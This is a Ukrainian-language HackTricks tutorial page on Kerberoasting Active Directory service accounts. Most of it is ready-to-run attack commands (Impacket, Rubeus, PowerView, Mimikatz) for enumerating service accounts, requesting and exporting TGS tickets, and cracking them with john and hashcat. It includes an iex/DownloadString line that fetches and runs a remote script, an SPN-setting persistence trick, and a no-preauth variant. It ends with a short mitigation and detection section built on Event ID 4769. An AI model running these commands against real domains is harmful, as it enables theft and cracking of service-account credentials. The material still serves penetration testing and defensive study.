# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) для легкої побудови та **автоматизації робочих процесів**, які працюють на основі найбільш **продвинутих** інструментів спільноти у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

## Kerberoast

Kerberoasting спрямований на отримання **TGS-квитків**, зокрема тих, що стосуються служб, які працюють під **обліковими записами користувачів** в **Active Directory (AD)**, виключаючи **облікові записи комп'ютерів**. Шифрування цих квитків використовує ключі, які походять від **паролів користувачів**, що дозволяє можливість **офлайн-відновлення облікових даних**. Використання облікового запису користувача як служби вказується непорожнім властивістю **"ServicePrincipalName"**.

Для виконання **Kerberoasting** необхідний обліковий запис домену, який може запитувати **TGS-квитки**; проте цей процес не вимагає **спеціальних привілеїв**, що робить його доступним для будь-кого з **дійсними обліковими даними домену**.

### Ключові моменти:

* **Kerberoasting** спрямований на **TGS-квитки** для **служб облікових записів користувачів** в **AD**.
* Квитки, зашифровані ключами від **паролів користувачів**, можуть бути **відновлені офлайн**.
* Служба ідентифікується за допомогою **ServicePrincipalName**, який не є порожнім.
* **Не потрібні спеціальні привілеї**, лише **дійсні облікові дані домену**.

### **Атака**

{% hint style="warning" %}
**Інструменти Kerberoasting** зазвичай запитують **`RC4 шифрування`** при виконанні атаки та ініціюванні запитів TGS-REQ. Це через те, що **RC4** є [**слабким**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) та легше відновлюється офлайн за допомогою інструментів, таких як Hashcat, ніж інші алгоритми шифрування, такі як AES-128 та AES-256.\
Хеші RC4 (тип 23) починаються з **`$krb5tgs$23$*`**, тоді як AES-256 (тип 18) починаються з **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Мульти-функціональні інструменти, включаючи дамп користувачів, які піддаються атакам Kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Перелік користувачів, які можна атакувати методом Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Техніка 1: Запитайте TGS та витягніть його з пам'яті**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Техніка 2: Автоматичні інструменти**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
При запиті TGS генерується подія Windows `4769 - Був запитаний квиток служби Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси**, які працюють на найбільш **продвинутих** інструментах спільноти у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Взламання
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Постійність

Якщо у вас є **достатньо дозволів** для користувача, ви можете зробити його **кербероастом**.
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Ви можете знайти корисні **інструменти** для атак **kerberoast** тут: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Якщо ви зустріли цю **помилку** на Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, це через ваш час на локальному комп'ютері, вам потрібно синхронізувати хост з DC. Є кілька варіантів:

* `ntpdate <IP of DC>` - Застаріло починаючи з Ubuntu 16.04
* `rdate -n <IP of DC>`

### Пом'якшення

Kербероастинг може бути проведений з високим рівнем прихованості, якщо він є вразливим. Для виявлення цієї активності слід звертати увагу на **Security Event ID 4769**, що вказує на запит квитка Kerberos. Однак через високу частоту цього події, необхідно застосовувати конкретні фільтри для ізоляції підозрілих дій:

* Ім'я служби не повинно бути **krbtgt**, оскільки це є нормальним запитом.
* Імена служб, що закінчуються на **$**, слід виключити, щоб уникнути включення облікових записів машин, які використовуються для служб.
* Запити від машин слід відфільтрувати, виключивши імена облікових записів у форматі **machine@domain**.
* Розглядати лише успішні запити квитків, ідентифіковані за кодом помилки **'0x0'**.
* **Найважливіше**, тип шифрування квитка повинен бути **0x17**, який часто використовується в атаках Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Для зменшення ризику Kerberoasting:

* Переконайтеся, що **Паролі облікових записів служби важко вгадати**, рекомендується довжина понад **25 символів**.
* Використовуйте **Керовані облікові записи служб**, які пропонують переваги, такі як **автоматична зміна паролю** та **делеговане керування іменами службових принципалів (SPN)**, підвищуючи безпеку від таких атак.

Впроваджуючи ці заходи, організації можуть значно зменшити ризик, пов'язаний з Kerberoasting.

## Kerberoast без облікового запису домену

У **вересні 2022 року** дослідник на ім'я Чарлі Кларк висвітлив новий спосіб використання системи через свою платформу [exploit.ph](https://exploit.ph/). Цей метод дозволяє отримати **Квитки служби (ST)** через запит **KRB\_AS\_REQ**, який, на відміну від інших методів, не потребує контролю над жодним обліковим записом Active Directory. По суті, якщо принципал налаштований таким чином, що не потребує попередньої аутентифікації - сценарій, схожий на те, що відомо в кібербезпеці як **атака AS-REP Roasting** - цю характеристику можна використовувати для маніпулювання процесом запиту. Зокрема, змінивши атрибут **sname** у тілі запиту, система обманюється, що видаватиме **ST** замість стандартного зашифрованого квитка для видачі квитків (TGT).

Техніку повністю пояснено в цій статті: [повідомлення блогу Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Вам потрібно надати список користувачів, оскільки у нас немає дійсного облікового запису для запиту LDAP за допомогою цієї техніки.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py з PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus з PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Посилання

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) для легкої побудови та **автоматизації робочих процесів** за допомогою найбільш **продвинутих** інструментів спільноти у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
